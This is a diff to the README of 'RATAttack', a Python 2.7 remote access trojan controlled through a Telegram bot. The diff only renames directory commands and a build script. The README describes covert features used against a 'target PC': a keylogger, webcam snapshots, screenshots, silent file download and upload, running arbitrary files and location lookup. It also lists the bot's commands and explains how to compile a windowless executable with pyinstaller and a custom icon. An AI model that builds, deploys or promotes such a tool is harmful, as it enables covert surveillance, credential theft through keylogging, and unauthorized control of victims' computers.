@@ -19,8 +19,10 @@ Windows Remote Administration Tool via Telegram (Python 2.7) | Originally create
 - Run keylogger on the target PC.
 - Get target PC's Windows version, processor and more.
 - Get target PC's IP address information and approximate location on map.
-- List any directories on the target.
-- Download any file locally from the target PC in the background.
+- Show current directory on target.
+- Change current directory on target.
+- List current directory on target.
+- Download any file from the target PC.
 - Upload local files on to the target PC. Send your image, pdf, exe or anything as `file` to the Telegram bot.
 - Screenshots of the target PC.
 - Execute any file on the target PC.
@@ -59,7 +61,9 @@ msg_box - display message box with text
 snapshot - take picture with webcam
 ip_info - via ipinfo.io
 download_file - download file from target
-list_dir - list contents of directory
+cd - change current directory on target
+pwd - show current directory
+ls - list contents of working directory
 run_file - run a file on target
 capture_pc - screenshot PC
 keylogs - get keylogs
@@ -73,7 +77,7 @@ You can copy the above to update your command list via `BotFather` so you don't 
 
 ### How To Compile:
 #### Either:
-	- Replace your path in compile.bat (**running this will actually run the executable**)
+	- Replace your path in compileAndRun.bat **(running this will actually run the executable)**
 	- Go to `C:\Python27\Scripts\` or wherever you installed python.
 #### Or:
 	- Run `pyinstaller --onefile --noconsole C:\path\to\RATAttack.py`. You can also pass `--icon=<path\to\icon.ico>` to use any custom icon.
@@ -87,7 +91,6 @@ You can copy the above to update your command list via `BotFather` so you don't 
 ## Notes:
 
 - Currently only Python2 is supported. Python3 support will be added soon!
-- `/msg_box` is still in beta and may not work properly.
 - Keylogger may detect some keys improperly. Like pressing `shift+/` results in recording `/` instead of `?`.
 
 ## Contributing:
